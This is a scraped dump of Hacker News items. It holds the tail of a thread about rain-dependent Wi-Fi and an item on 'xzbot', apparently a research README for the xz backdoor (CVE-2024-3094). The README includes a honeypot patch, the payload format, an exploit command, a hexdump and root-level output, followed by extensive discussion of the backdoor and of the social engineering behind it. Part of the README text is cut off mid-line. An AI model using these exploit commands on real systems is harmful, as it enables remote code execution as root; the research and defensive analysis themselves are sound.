hours agoprevBack in the dialup days, my dialup would die, and be unable to re-connect at dusk. Other than that, it was fine, for dialup. reply ck2 16 hours agoprevActually experience the same thing but for different reasons. I've lived in the same place for 25 years, so I've seen the invention of wifi and then checking every few months for other users on wifi analyzer, I've seen it grown and grown. Well in that 25 years they've built so many surrounding apartment complexes that the 2.4ghz saturation is absolutely insane. I cannot believe how many networks show up on the analyzer in 2024, has to be well over 100. But when it rains, it cuts off dozens of those other apartments, and I get better signal inside my own apartment. reply jonhohle 13 hours agoprevMy garage door opener works much better when it’s raining and also at night. I’m out case, our solar inverter (or one or more of the optimizers at the panels) creates enough noise to interfere. I also believe our microwave is adding noise to the same circuit our WiFi router is on. Despite using 5GHz, WiFi is severely degraded whenever the microwave is on. reply AnarchismIsCool 13 hours agoparentYou should get a new microwave. It's probably not the mains circuit, it's probably leaking enough radiation to overload the RF frontend on the router. If the router gets enough energy the \"sine wave\" of the radio signal starts to flatten out at the top and bottom and becomes a rounded off square wave which we call \"clipping\". This has the original frequency component, but also a ton of other frequency components that push up into much higher frequency bands like 5GHz. Fun fact, this is why electric guitars add a high pitch scratchy noise, they're reaching the distortion/clipping threshold of their amplifier. reply MichaelMug 15 hours agoprevI recall there was a story about a computer mouse not working when it was sunny? It had to do with the sensor. I can't find it so I'm starting to doubt if that actually happened... Edit: Found it: https://news.ycombinator.com/item?id=37585548 reply kayodelycaon 14 hours agoparentWouldn't surprise me. Optical mice don't like transparent or some translucent surfaces. reply fuzztester 9 hours agoprev\"Thunder only happens when it's raining\" https://youtu.be/Y3ywicffOj4 1:15 reply treme 9 hours agoprevI read about random bit flips but haven't read a good anecdote about it, if anyone can be so kind. reply punnerud 15 hours agoprevCould also have be that the neighbor have a not compliant WiFi device that send out deauthentication packages, then it would also work better during rain. And the same upgrade would often fix it reply mschuster91 16 hours agoprevI had more thought of an issue regarding bad grounding (i.e. grounding rods dried out and only work properly when the earth is wet), but trees are even more unexpected. reply bdavbdav 16 hours agoparentThis was my thinking. Or some other poorly seated electrical connection that somehow got better when it was damp. reply brazzy 15 hours agoparentprevMy guess was that water accumulates somewhere and bends the antenna out of alignment. reply 1024core 13 hours agoprevReminds me of that old tale about a lady whose phone would not ring, and her dog would bark before the phone rang. reply helph67 12 hours agoparentJust the basic facts... Climbing a nearby telephone pole and hooking in his test set, he dialed the subscriber's house. The phone didn't ring. He tried again. The dog barked loudly, followed by a ringing telephone. Climbing down from the pole then he found: a. Dog was tied to the telephone system's ground post via an iron chain and collar. b. Dog was receiving 90 volts of signalling current. c. After several jolts, the dog was urinating on ground and barking. d. Wet ground now conducted and phone rang. Which goes to prove that some grounding problems can be passed on. reply xyzelement 16 hours agoprevThe article briefly mentions that this was unbelievable because rain should make Wi-Fi worse not better. That parallels my experience but I didn’t realize was commonly understood. I noticed that in the hot summer the Wi-Fi reception in my yard (IE, farther from the access point in the house) is worse. Eventually I decided that summer heat is really proxy for humidity and that it wasn’t unreasonable for high water concentration in the air to provide an obstacle to Wi-Fi signal. reply leononame 13 hours agoprevI enjoyed the story, but the writing I enjoyed even more. I really liked the tone and wittiness. reply valzam 12 hours agoprevMy Wifi doesn't work properly when it's raining, can be combine forces? reply obi1kenobi 12 hours agoparent(Author here) I'm worried they might combine in a way that leaves them not working neither rain nor shine! reply kwhitefoot 15 hours agoprevSounds like it would be a neat excuse to get the children to go out when it's sunny! reply IG_Semmelweiss 11 hours agoprev>>> Maybe an antenna connector has corroded from spending years outdoors? Nope. Most people living in large metros will never fathom how wifi will simply stop working in the suburbs. It is easy to forget that Internet cables -normally hidden in cities- are completely exposed to elements in suburbs Lost wifi while at parent's ? Check the roof! reply jboogie77 10 hours agoprevWhy does this sound like it was written by AI? reply numpad0 8 hours agoparentHuman writing with short context window can sound like AI too reply obi1kenobi 7 hours agorootparent(Author here) The image is AI generated. I did not use any AI to write the post itself. That's just my style of writing, you can check my pre-GPT posts and compare if you'd like. reply adammarples 10 hours agoprevThe WiFi only works when it's raining (ps. one critical part of my WiFi setup is outdoors and depends on having a clear line of sight) reply zwieback 12 hours agoprevWhat kind of a tree is it? reply obi1kenobi 12 hours agoparent(Author here) I'm not a tree expert, so ... a tall deciduous one? Sorry! reply seoulmetro 9 hours agoprevI hate how fake this sounds since it's a funny story. Trees leaves being weighed down by a slight drizzle? What tree does that? None around where I live. A tree blocking signals that strong as well? Doesn't make sense to me either. reply 2-3-7-43-1807 1 hour agoprevbit disappointed ... this is a very obscure set up and frankly speaking under those circumstances sth like \"rain affects the wifi [either way]\" is obviously not even close to magical thinking. definitely not worth almost 1000 upvotes. reply anothernewdude 11 hours agoprevHere I thought it would be because it would be interfering with noise from other networks. reply DonHopkins 13 hours agoprevThat would be ironic on your wedding day. reply 17 more comments... GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The author shares a story about their home Wi-Fi only functioning during rain, eventually pinpointing a neighbor's tree as the signal disruptor.",
      "Upgrading the hardware fixed the issue, emphasizing the significance of having the right equipment for a reliable internet connection.",
      "This anecdote is part of the April Cools Club, which aims to showcase genuine essays on surprising subjects every April 1st."
    ],
    "commentSummary": [
      "Users share quirky anecdotes like Wi-Fi working only during rain and emails not traveling over 500 miles, showcasing the intersection of physical reality and tech models.",
      "Discussions include high-frequency trading via microwave towers, tech-related stories, and how environmental factors affect network systems.",
      "Anecdotes cover internet connectivity problems, troubleshooting odd tech issues, weather impacts on networks, interference from electronic devices in shared frequency bands, and optimizing Wi-Fi signal strength."
    ],
    "points": 889,
    "commentCount": 267,
    "retryCount": 0,
    "time": 1711991256
  },
  {
    "id": 39895344,
    "title": "Xzbot: Exploiting CVE-2024-3094 Backdoor - Honeypot and Demo",
    "originLink": "https://github.com/amlweems/xzbot",
    "originBody": "xzbot Exploration of the xz backdoor (CVE-2024-3094). Includes the following: honeypot: fake vulnerable server to detect exploit attempts ed448 patch: patch liblzma.so to use our own ED448 public key backdoor format: format of the backdoor payload backdoor demo: cli to trigger the RCE assuming knowledge of the ED448 private key honeypot See openssh.patch for a simple patch to openssh that logs any connection attempt with a public key N matching the backdoor format. $ git clone https://github.com/openssh/openssh-portable $ patch -p1/tmp/.xz\") The following will connect to a vulnerable SSH server at 127.0.0.1:2222 and run the command id > /tmp/.xz: $ xzbot -addr 127.0.0.1:2222 -cmd 'id > /tmp/.xz' 00000000 00 00 00 1c 73 73 68 2d 72 73 61 2d 63 65 72 74 |....ssh-rsa-cert| 00000010 2d 76 30 31 40 6f 70 65 6e 73 73 68 2e 63 6f 6d |-v01@openssh.com| 00000020 00 00 00 00 00 00 00 03 01 00 01 00 00 01 01 01 |................| 00000030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| ... 00000150 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00000160 00 00 01 14 00 00 00 07 73 73 68 2d 72 73 61 00 |........ssh-rsa.| 00000170 00 00 01 01 00 00 01 00 02 00 00 00 01 00 00 00 |................| 00000180 00 00 00 00 00 00 00 00 54 97 bc c5 ef 93 e4 24 |........T......$| 00000190 cf b1 57 57 59 85 52 fd 41 2a a5 54 9e aa c6 52 |..WWY.R.A*.T...R| 000001a0 58 64 a4 17 45 8a af 76 ce d2 e3 0b 7c bb 1f 29 |Xd..E..v....|..)| 000001b0 2b f0 38 45 3f 5e 00 f1 b0 00 15 84 e7 bc 10 1f |+.8E?^..........| 000001c0 0f 5f 50 36 07 9f bd 07 05 77 5c 74 84 69 c9 7a |._P6.....w\\t.i.z| 000001d0 28 6b e8 16 aa 99 34 bf 9d c4 c4 5c b8 fd 4a 3c |(k....4....\\..J /tmp/.xz $ cat /tmp/.xz uid=0(root) gid=0(root) groups=0(root) The process tree after exploitation looks different from a normal sshd process tree: # normal process tree $ ssh foo@bar $ ps -ef --forest root 765 1 0 17:58 ? 00:00:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups root 1026 765 7 18:51 ? 00:00:00 \\_ sshd: foo [priv] foo 1050 1026 0 18:51 ? 00:00:00 \\_ sshd: foo@pts/1 foo 1051 1050 0 18:51 pts/1 00:00:00 \\_ -bash # backdoor process tree $ xzbot -cmd 'sleep 60' $ ps -ef --forest root 765 1 0 17:58 ? 00:00:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups root 941 765 4 18:04 ? 00:00:00 \\_ sshd: root [priv] sshd 942 941 0 18:04 ? 00:00:00 \\_ sshd: root [net] root 943 941 0 18:04 ? 00:00:00 \\_ sh -c sleep 60 root 944 943 0 18:04 ? 00:00:00 \\_ sleep 60 Note: successful exploitation does not generate any INFO or higher log entries. References https://www.openwall.com/lists/oss-security/2024/03/29/4 https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504 https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01 https://gist.github.com/keeganryan/a6c22e1045e67c17e88a606dfdf95ae4",
    "commentLink": "https://news.ycombinator.com/item?id=39895344",
    "commentBody": "Xzbot: Notes, honeypot, and exploit demo for the xz backdoor (github.com/amlweems)765 points by q3k 18 hours agohidepastfavorite396 comments bilekas 4 hours agoThis whole thing has been consuming me over the whole weekend. The mechanisms are interesting and a collection of great obfuscations, the social engineering is a story that’s shamefully all too familiar for open source maintainers. I find most interesting how they chose their attack vector of using BAD test data, it makes the rest of the steps incredibly easier when you have a good archive, manipulate it in a structured method (this should show on a graph of the binary pattern btw for future reference) then use it for a fuzzy bad data test. It’s great. The rest of the techniques are banal enough except the most brilliant move seems to be that they could add “patches” or even whole new back doors using the same pattern on a different test file. Without being noticed. Really really interesting, GitHub shouldn’t have hidden and removed the repo though. It’s not helpful at all to work through this whole drama. Edit: I don’t mean to say this is banal in any way, but once the payload was decided and achieved through a super clever idea, the rest was just great obfuscation. reply withinboredom 3 hours agoparentIt’s got me suspicious of build-time dependency we have in an open source tool, where the dependency goes out of its way to prefer xz and we even discovered that it installs xz on the host machine if it isn’t already installed — as a convenience. Kinda weird because it didn’t do that for any other dependencies. These long-games are kinda scary and until whatever “evil” is actually done you have no idea what is actually malicious or just weird. reply ToneWashed 2 hours agorootparent> It’s got me suspicious of build-time dependency we have in an open source tool, where the dependency goes out of its way to prefer xz and we even discovered that it installs xz on the host machine if it isn’t already installed — as a convenience. Kinda weird because it didn’t do that for any other dependencies. Have you considered reaching out to the maintainers of that project and (politely) asking them to explain? In lieu of recent events I don't think anyone would blame you, in fact you might even suggest they explain such an oddly specific side effect in a README or such. reply withinboredom 2 hours agorootparent> Have you considered reaching out to the maintainers of that project and (politely) asking them to explain? That's kind of a catch-22, right? They'd explain with a seemingly good answer if they did it for actual reasons. They'll still explain with a seemingly good answer if they did it for nefarious reasons. I don't have a good answer to this except to monitor this dependency and its changes. reply throw156754228 36 minutes agoparentprevThey removed the repo so only the attackers had access to the code and know how. reply andybak 1 minute agorootparentNo. They obviously didn't do that so you're just being sarcastic but not actually making any point of your own in addition to that. reply mondrian 4 hours agoparentprevA main culprit seems to be the addition of binary files to the repo, to be used as test inputs. Especially if these files are “binary garbage” to prove a test fails. Seems like an obvious place to hide malicious stuff. reply bilekas 4 hours agorootparentIt is an obvious place for sure, but it also would have been picked up if the builds where a bit more transperant. That batch build script should have been questioned before approval. reply j16sdiz 2 hours agorootparentBy whom? The attacker have assumed the maintainer role. Nobody is reviewing. reply asveikau 17 hours agoprevIt's pretty interesting that they didn't just introduce an RCE that anyone can exploit, it requires the attacker's private key. It's ironically a very security conscious vulnerability. reply haswell 16 hours agoparentI suspect the original rationale is about preserving the longevity of the backdoor. If you blow a hole wide open that anyone can enter, it’s going to be found and shut down quickly. If this hadn’t had the performance impact that brought it quickly to the surface, it’s possible that this would have lived quietly for a long time exactly because it’s not widely exploitable. reply eli 14 hours agorootparentMore to the point it prevents your enemies from using the exploit against friendly targets. The tradeoff is that, once you find it, it's very clearly a backdoor. No way you can pretend this was an innocent bug. reply declan_roberts 15 hours agorootparentprevI agree that this is probably about persistence. Initially I thought the developer was playing the long-con to dump some crypto exchange and make off with literally a billion dollars or more. But if that was the case they wouldn't bother with the key. It'd be a one-and-done situation. It would be a stop-the-world event. Now it looks more like nation-state spycraft. reply btown 14 hours agorootparentIt's worth also noting that the spycraft involved a coordinated harassment campaign of the original maintainer, with multiple writing styles, to accelerate a transition of maintainership to the attacker: https://www.mail-archive.com/xz-devel@tukaani.org/msg00566.h... https://www.mail-archive.com/xz-devel@tukaani.org/msg00568.h... https://www.mail-archive.com/xz-devel@tukaani.org/msg00569.h... While this doesn't prove nation-state involvement, it certainly borrows from a wide-ranging playbook of techniques. reply mrkramer 13 hours agorootparentAt first I thought the guy who did this was a lone wolf but now I believe it was indeed state actor. They coordinated and harassed original maintainer into giving them access to the project, basically they hijacked the open source project. The poor guy(the original maintainer) was alone against state actor who was persistent with the goal of hijacking and then backdooring the open source project. It seems like they were actively looking[0] which open source compression library they can inject with vulnerable code and then exploit and backdoor afterwards. [0] https://lwn.net/Articles/967763/ reply pyinstallwoes 2 hours agorootparent> “Recently I've worked off-list a bit with Jia Tan on XZ Utils and” > \"In 2021, JiaT75 submitted a pull request to the libarchive repository with the title ‘Added error text to warning when untaring with bsdtar’ which seemed legitimate at first glance. \" Seems “Jia” is related to both reply asveikau 12 hours agorootparentprevReading that link, it seems like the vulnerability is that a file name gets printed, so you can add terminal control characters in a file name and have it printed. https://github.com/libarchive/libarchive/pull/1609#issuecomm... reply allanbreyes 13 hours agorootparentprevUgh, that this psyops sockpuppetry may have started or contributed to the maintainer's mental health issues seems like the most depressing part of all this. Maintaining OSS is hard enough. reply btown 13 hours agorootparentI hope that one takeaway from this entire situation is that if you're a maintainer and your users are pushing you outside your levels of comfort, that's a reflection on them, not on you - and that it could be reflective of something far, far worse than just their impatience. If you, as a maintainer, value stability of not only your software but also your own mental health, it is entirely something you can be proud of to resist calls for new features, scope increases, and rapid team additions. reply heavyset_go 10 hours agorootparentprevYeah, that was a hard read. I think it highlights the importance of emotionally distancing yourself from your projects. It's also interesting because it exploits the current zeitgeist when it comes to maintainers' responsibilities to their users and communities. Personally, I think it puts too much expectation on maintainers' shoulders, especially when they're working for free. Personally, I think maintainers are doing favors for users, and if they don't like how the project is progressing or not, then too bad. That's not a popular sentiment, though. reply __MatrixMan__ 13 hours agorootparentprevNo good deed goes unpunished, what a shame. reply Delk 12 hours agorootparentprevProbably didn't start them, considering that he already mentioned (long-term) mental health issues in the mailing list discussion in which the (likely) sock puppets started making demands. But it's hard to see the whole thing helping, and it is some combination of depressing and infuriating. I hope he's doing ok. reply tapland 10 hours agorootparentYou only push after you've established your guy as the likely successor. If this was coordinated it was not the first move. reply furstenheim 12 hours agorootparentprevI actually wondered how many packages they harassed until they got access to one such reply metrxqin 4 hours agorootparentprevI'm literally shocked by the conversations in the mail-list, it's blatantly an exploitation of others' kindness. reply Voultapher 13 hours agorootparentprevI mean one person can use sock puppet accounts to write emails. reply yread 12 hours agorootparentprevMaybe they weren't all sockpuppets. Here Jigar Kumar was nitpicking Jia Tan's changes: https://www.mail-archive.com/xz-devel@tukaani.org/msg00556.h... That was not necessary to gain trust. Writing style is different, too. Later when Jia gained commit access he reminds him to merge it. reply asveikau 11 hours agorootparentThis looks like a very phony \"debate\". I think the most convincing case made about the sock puppets is around account creation dates, and also people disappearing after they get what they need. Like Jigar disappearing after Jia becomes maintainer. Or the guy \"misoeater19\" who creates his debian bug tracker account to say that his work is totally blocked on needing xz 5.6.1 to be in debian unstable. reply pyinstallwoes 2 hours agorootparentAh, the good ol’ lever of urgency. Urgency frequency smells of deception. reply barkingcat 12 hours agorootparentprevthat's precisely what sock puppetry does ... talk/write in a different writing style to make others believe it's different people. reply bdowling 4 hours agorootparentFor all we know there is a whole cyber-squadron (or whatever their military units are called) behind Jia Tan and other accounts. reply juitpykyk 11 hours agorootparentprevYou're talking as if securing a backdoor with public cryptography is some unimaginable feat of technology. It's literally a couple hours work. reply parl_match 6 hours agorootparentInserting a change like this as a one off would cause lots of scrutiny, which would probably get it detected. Instead, the bad actor spent years contributing to the project before dropping this. So, while writing the exploit might be a couple of hours work, actually pulling it off is quite a bit more difficult. reply kbenson 11 hours agorootparentprevI don't think they were using complexity as the reason for that assumption, but instead goals. Adding security doesn't require a nation state's level of resources, but it is a more attractive feature for a nation state that wants to preserve it over time and prevent adversaries from making use of it. reply heavyset_go 10 hours agorootparentThis makes sense in closed source products where you'll never get to audit the source for such exploits, but little sense in open source projects where anyone can audit it. That's to say an enterprise router or switch would likely have secured exploits put there by corporate and national security agencies, whereas open source exploits would benefit from the probable deniability. reply neodymiumphish 11 hours agorootparentprevAnd on the contrary, creating a vulnerability that’s not identifiable to a limited attack group provides for a bit more deniability and anonymity. It’s hard to say which is more favorable by a nation-state actor. reply usrusr 10 hours agorootparentAn interesting angle: if this was somehow observed in use instead of getting discovered without observing use, there would be a glaring bright cui bono associated with what it was being used for. Theoretically, I could even imagine that public key security motivated by some \"mostly benign\" actor who fell in love with the question \"could I pull this off?\" dreading the scenario of their future hacker superpower falling in the wrong hands. It's not entirely unthinkable that an alternative timeline where this was never discovered would only ever see this superbackdoor getting used for harmless pranks, winning bets and the like. In this unlikely scenario, the discovery, through the state actor and crime syndicate activities undoubtedly inspired by the discovery, would paradoxically lead to a less safe computing world than the alternative timeline where the person with the key had free RCE almost everywhere. reply justinclift 10 hours agorootparentprevIt'll be kind of tragic if this backdoor turns out to be the developer's pet \"enable remote debugging\" code, and they didn't mean for it to get out into a release. ;) reply unkulunkulu 8 hours agorootparentI would be scared to work near a person who writes his debugging tools this way :D reply justinclift 5 hours agorootparentHeh Heh Heh \"It seemed like a good idea at the time\" is a pretty common story though. ;) reply meowface 15 hours agorootparentprev>But if that was the case they wouldn't bother with the key. It'd be a one-and-done situation. It would be a stop-the-world event. Why not? It's possible someone else could've discovered the exploit before the big attack but decided not to disclose it. Or that they could've disclosed it and caused a lot of damage the attacker didn't necessarily want. And they easily could've been planning both a long-term way to access a huge swath of machines and also biding their time for a huge heist. They have no reason to not restrict the backdoor to their personal use. And it probably is spycraft of some sort, and I think more likely than not it's a nation-state, but not necessarily. I could see a talented individual or group wanting to pull this off. reply varenc 12 hours agorootparentI think we need to consider the context. The attacker ultimately only had control over the lzma library. I'm skeptical that there's an innocent looking way that lzma could have in the open introduced an \"accidental\" RCE vuln that'd affect sshd. Of course I agree that they also wanted an explicit stealth backdoor for all the other reasons, but I don't think a plausibly deniable RCE or authentication bypass vuln would have even been possible. reply heavyset_go 10 hours agorootparentprev> Now it looks more like nation-state spycraft. I disagree, plenty of exploits implemented WireGuard-like crypto key access to them. reply Beijinger 12 hours agorootparentprevThis is just a safety measure that it does not blow up in your own face (country). reply CommitSyn 6 hours agorootparentNot only did it mandate authentication, but there was also a Killswitch, and there's no other reason for that than because you have reasons to suspect someone may have access to this sensitive world-stopper exploit and use it against you. That leaves simply a (reasonably, but still) paranoid person, and people worried about that+consequences are unlikely to have the mental well-being to pull this off, or, a group of people. reply chpatrick 12 hours agorootparentprevAlso people can come and immediately undo whatever you did if it's not authenticated. reply takeda 13 hours agoparentprevIf you think of it as a state sponsored attack it makes a lot of sense to have a \"secure\" vulnerability in system that your own citizens might use. It looks like the whole contribution to xz was an effort to just inject that backdoor. For example the author created the whole test framework where he could hide the malicious payload. Before he started work on xz, he made contribution to libarchive in BSD which created a vulnerability. reply pxx 13 hours agorootparentThe libarchive diff didn't create any vulnerability. The fprintf calls were consistent with others in the same repository. reply jhugo 11 hours agorootparentIt did, actually: the filename can contain terminal control characters, which thanks to the change from safe_fprintf to fprintf, were printed without escaping, which allows the creator of the archive being extracted to control the terminal of the user extracting the archive. reply pxx 8 hours agorootparentThat's (a) not exploitable without the existence of a much higher-severity exploit -- sure you can clear the screen, but that's low impact (b) possible to trigger on other extant paths; see https://github.com/libarchive/libarchive/issues/2107 so it seems nothing new was introduced (c) kind of contrived to get to execute; you have to somehow fail to extract the archive but on the happy path you'll see a bunch of weirdly-named files I think it's distinctly higher-probability that this change was just meant to build credibility for the GitHub account. The diff is a fairly trivial patch to a minor issue filed around the same time as the pull request. reply CommitSyn 6 hours agorootparentIs it possible it was part of a planned or current exploit chain, some other way it could have been utilized? reply takeda 13 hours agorootparentprevThey still preferred to revert it as it looks very suspicious. https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1068047 https://github.com/libarchive/libarchive/pull/2101 reply asveikau 12 hours agorootparentIf I read that correctly the problem is that it prints a filename that might include terminal control sequences that come from an attacker-controlled file name. Comment in your second link: https://github.com/libarchive/libarchive/pull/1609#issuecomm... reply Alifatisk 16 hours agoparentprevFor real, it's almost like a state-sponsored exploit. It's crafted and executed incredibly well, the performance issue feels like pure luck it got found. reply stingraycharles 16 hours agorootparentI like the theory that actually, it wasn’t luck but was picked up on by detection tools of a large entity (Google / Microsoft / NSA / whatever), and they’re just presenting the story like this to keep their detection methods a secret. It’s what I would do. reply est31 16 hours agorootparentI doubt that if Google detected it with some internal tool, they'd reach out to Microsoft to hide their contribution. It was reported by an MS engineer who happens to be involved in another OSS project. MS is doing business with the US intelligence community, for example there is the Skype story: First, rumors that NSA offers a lot of money for people who can break Skype's E2E encryption, then MS buys Skype, then MS changes Skype's client to not be E2E encrypted any more and to use MS servers instead of peer to peer, allowing undetectable wiretapping of arbitrary connections. But it's a quite credible story too that it was just a random discovery. Even if it was the NSA, why would they hide that capability. It doesn't take much to run a script to compare git state with uploaded source tarballs in distros like Debian (Debian has separate tarballs for the source and the source with Debian patches applied). reply anarazel 15 hours agorootparent> It was reported by an MS engineer who happens to be involved in another OSS project. I view it as being OSS or postgresql dev that happens to work at microsoft. I've been doing the former for much longer (starting somewhere between 2005 and 2008, depending on how you count) than the latter (2019-12). reply est31 11 hours agorootparentThanks for the explanation. Also thanks for catching this and protecting us all; I think in the end it's way more believable that you indeed found it on your own, above was just brainless blathering into the ether =). Lastly, thanks for your Postgres contributions. reply t0mas88 13 hours agorootparentprevIntelligence agencies are very careful about sharing their findings, even with \"friends\", because the findings will disclose some information about their capabilities and possibly methods. Let's say agency A has some scanning capability on open source software that detected this backdoor attempt by agency B. If they had gone public, agency B now knows they have this ability. So agency B will adjust their ways the next time and the scanning capability becomes less useful. While if agency A had told Microsoft to \"find\" this by accident, nobody would know about their scanning capability. And the next attempt by agency B would only try to avoid having the performance impact this first attempt had, probably leaving it visible to agency A. reply bevekspldnw 14 hours agorootparentprev“Even if it was the NSA, why would they hide that capability” Perhaps you’re not familiar with what NSA historically stood for: Never Say Anything. reply est31 10 hours agorootparentGoogling for \"site:nsa.gov filetype:pdf\" gives tens of thousands of results with documents produced by the NSA about various things (the google counter is known to lie but that's not my point). They do publish things. reply mistrial9 11 hours agorootparentprev> an MS engineer no this engineer is world-known for being core PostgreSQL, a team with high standards.. unlike that company you mention reply jeltz 4 hours agorootparentHe is also one of the sharpest developers I have had the fortune to speak to (and do some minor work with on the mailing list) and he knows a lot about performance and profiling. I 100% think that he found it on his own. He would also be an odd choice for Microsoft to pick since I doubt he works anywhere close to any of their security teams (unless they went through some serious lengths to find just the guy where it would be 100% believable that he just stumbled on it). reply est31 10 hours agorootparentprevYeah definitely, good point. I got that wrong above: He is in fact a postgres contributor who happens to be MS employee and not an MS employee who happens to be a postgres contributor. reply jsmith99 16 hours agorootparentprevThe attacker changed the projects contact details at oss fuzz (an automated detection tool). There’s an interesting discussion as to whether that would have picked up the vulnerability https://github.com/google/oss-fuzz/issues/11760 reply metzmanj 13 hours agorootparentI work on oss-fuzz. I don't think it's plausible OSS-Fuzz could have found this. The backdoor required a build configuration that was not used in OSS-Fuzz. I'm guessing \"Jia Tan\" knew this and made changes to XZ's use of OSS-Fuzz for the purposes of cementing their position as the new maintainer of XZ, rather than out of worry OSS-Fuzz would find the backdoor as people have speculated. reply Aloisius 7 hours agorootparentHow many oss-fuzz packages have a Dockerfile that runs apt-get install liblzma-dev first? Had this not been discovered, the backdoored version of xz could have eventually ended up in the ubuntu version oss-fuzz uses for its docker image - and linked into all those packages being tested as well. Except now there's an explanation if fuzzing starts to fail - honggfuzz uses -fsanitize which is incompatible with xz's use of ifunc, so any package that depends on it should rebuild xz from source with --disable-ifunc instead of using the binary package. reply meowface 14 hours agorootparentprevThat's a fascinating extra detail. They really tried to cover all their bases. There's some plausible evidence here that they may've tried to use alter egos to encourage Debian to update the package: https://twitter.com/f0wlsec/status/1773824841331740708 reply edflsafoiewq 16 hours agorootparentprevThey could announce it without revealing their detection method. I don't see what the extra indirection buys them. reply MOARDONGZPLZ 15 hours agorootparentShutting down 99.9% of speculation on how the vulnerability was found in the first place. reply VMG 13 hours agorootparent(1) obviously not (2) they could just say they found it during some routine dependency review or whatever reply MOARDONGZPLZ 8 hours agorootparentI mean, yes. I’ve read all the commentary I can get my hands on about this incident because it is fascinating and this is the first instance of some parallel construction theory of finding it I’ve seen. Second, maybe a routine dependency review is how they _actually_ found it but they don’t want future people like this focusing too much on that otherwise they may try to mitigate, whereas now they may focus on something inane like a 0.5 second increase in sshd’s load time or whatever. reply TacticalCoder 14 hours agorootparentprev> ... nd they’re just presenting the story like this to keep their detection methods a secret. It’s what I would do. Basically \"parallel construction\". It's very possible it's what happened. https://en.wikipedia.org/wiki/Parallel_construction reply takeda 13 hours agorootparentprevSorry for that ugly comparison, but that explanation reminds me of the theories when covid started, that it was created by secret organization that is actually ruling the world. People love when there's some explanation that doesn't involve randomness, because with randomness looks like we don't have grasp on things. Google actually had tooling that was detecting it, but he disabled check that would show it. Google/Microsoft/NSA could just say they detected it with internal tooling and not disclose how exactly. Google and Microsoft would love to have credit. reply meowface 14 hours agorootparentprevIt's really interesting to think what might've happened if they could've implemented this with much less performance overhead. How long might it have lasted for? Years? reply heavyset_go 10 hours agorootparentprevYou're describing parallel construction and it is something that happens all of the time. reply andersa 16 hours agorootparentprevIt'd make total sense if it was. This way you get to have the backdoor without your enemies being able to use it against your own companies. reply 7373737373 14 hours agorootparentprevI read someone speculating that the performance issue was intentional, so infected machines could be easily identified by an internet wide scan without arousing further suspicicion. If this is or becomes a widespread method, then anti-malware groups should perhaps conduct these scans themselves. reply zarzavat 12 hours agorootparentVery small differences in performance can be detected over the network as long as you have enough samples. Given that every port 22 is being hit by a gazillion attempts per day already, sample count shouldn’t be an issue. So if distinguishing infected machines was their intention they definitely over-egged it. reply jdewerd 16 hours agorootparentprevYeah, we should probably expect that there are roughly 1/p(found) more of these lurking out there. Not a pleasant thought. reply hnthrowaway0328 16 hours agorootparentprevDo we have a detailed technical analysis of the code? I read a few analysis but they all seem preliminary. It is very useful to learn from the code. reply coldpie 16 hours agorootparentThere's a few links down at the bottom of the OP to quite detailed analysis. From there you could join a Discord where discussion is ongoing. reply hnthrowaway0328 13 hours agorootparentThanks coldpie. reply IshKebab 13 hours agorootparentprevI don't think it was executed incredibly well. There were definitely very clever aspects but they made multiple mistakes - triggering Valgrind, the performance issue, using a `.` to break the Landlock test, not giving the author a proper background identity. I guess you could also include the fact that they made it a very obvious back door rather than an exploitable bug, but that has the advantage of only letting you exploit it so it was probably an intentional trade-off. Just think how many back doors / intentional bugs there are that we don't know about because they didn't make any of these mistakes. reply richardfey 12 hours agorootparentMaybe it's the first successful attempt of a state which nobody would right now suspect as capable of carrying this out. Everyone is looking at the big guys but a new player has entered the game. reply lyu07282 15 hours agorootparentprevone question I still have is what exactly the performance issue was? I heard it might be related to enumeration of shared libraries, decoding of the scrambled strings[1], etc. anyone know for sure yet? one other point for investigation is if the code is similar to any other known implants? like the way it obfuscates strings, the way it detects debuggers, the way its setting up a vtable, there might be code fragments shared across projects. Which might give clues about its origin. [1] https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01 reply timmytokyo 15 hours agorootparentprevI'm not sure why everyone is 100% sure this was a state-sponsored security breach. I agree that it's more likely than not state-sponsored, but I can imagine all sorts of other groups who would have an interest in something like this, organized crime in particular. Imagine how many banks or crypto wallets they could break into with a RCE this pervasive. reply bevekspldnw 13 hours agorootparentMotive and patience. Motive as you point out is shared by many parties. Typically its only state agencies that will fund an operation with uncertain pay off over long periods of time. That type of patience is expensive. Online criminals are beholden to changing market pressures and short term investment pressures like any other start up. reply blablabla123 15 hours agorootparentprevEspecially considering this introduced a 500ms waiting time. But surely this was quite a risky time investment, 2 years. How likely is it that this was the only attempt if this was done by a group? (And maybe there were failed attempts after trying to take over maintenance of other packages?) Maybe really a very well-funded cybercrime group that can afford such moonshot endeavours or a state group that doesn't completely know yet what it's doing or isn't that well equipped (anymore?). I'm definitely curious about analysis of attribution reply webmaven 15 hours agorootparentprevWas the performance issue pure luck? Or was it a subtle bit of sabotage by someone inside the attacking group worried about the implications of the capability? If it had been successfully and secretly deployed, this is the sort of thing that could make your leaders much more comfortable with starting a \"limited war\". There are shades of \"Setec Astronomy\" here. reply papascrubs 10 hours agorootparentPlot twist: It was a psyop to increase the scrutiny around OSS components. Kidding. Mostly... But given the amount of scrutiny folks are going to start putting into some supply chains... Probably cheaper to execute than most company's annual security awareness budgets cost. reply neodymiumphish 8 hours agorootparentprevConsidering how difficult it might be (and identifiable) to attempt direct exploitation of this without being sure your target is vulnerable, it’s plausible the performance issue allowed for an identifiable delay in attempts. This might be useful in determining whether to attempt the exploit, with an auto-skip if it received a response in less than N milliseconds. reply cesarb 15 hours agoparentprevThis is called NOBUS: https://en.wikipedia.org/wiki/NOBUS reply halJordan 13 hours agorootparentThis is not that concept. That concept is no one but us can technically complete the exploit. Technical feasibility in that you need a supercomputer to do it, not protecting a backdoor with the normal cia triad reply justinclift 10 hours agorootparentThat doesn't seem correct: If they determine the vulnerability is only exploitable by the NSA for reasons such as computational resources, budget, or skill set, they label it as NOBUS and will not move to patch it, but rather leave it open to exploit against current or future targets. If (!) the NSA regards ssh keys as secure, then from that article it sounds like the NOBUS thing would fit. reply 